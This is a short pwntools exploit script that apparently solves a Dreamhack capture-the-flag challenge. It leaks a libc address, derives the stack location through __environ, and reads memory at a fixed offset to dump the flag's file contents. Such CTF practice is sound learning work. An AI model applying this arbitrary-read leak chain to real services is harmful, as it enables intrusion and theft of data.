from pwn import *
p = remote('host3.dreamhack.games', 14946)
e = ELF('./libc.so.6')

p.recvuntil(b": ")
stdout = int(p.recvuntil(b"\n"), 16)
libc_base = stdout - e.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + e.symbols['__environ']

print(f"libc_base: {hex(libc_base)}")
print(f"libc_environ: {hex(libc_environ)}")

p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(libc_environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b'\x00'))
file_content = stack_environ - 0x1568
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(file_content).encode())

p.interactive()